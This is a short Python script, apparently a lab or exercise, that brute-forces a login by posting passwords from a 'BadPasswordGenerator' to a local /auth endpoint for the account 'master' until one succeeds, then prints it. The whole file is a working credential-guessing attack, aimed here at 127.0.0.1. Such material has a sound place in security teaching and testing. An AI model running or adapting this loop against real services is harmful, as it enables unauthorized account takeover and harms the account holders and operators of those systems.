import requests

from BadPasswordGenerator import BadPasswordGenerator

generator = BadPasswordGenerator()

while True:
    password = generator.next()
    response = requests.post ('http://127.0.0.1:5000/auth',
                                                    json = {'login' : 'master', 'password' : password})
    if response.status_code == 200 :
        print('SUCCESS', password)
        break


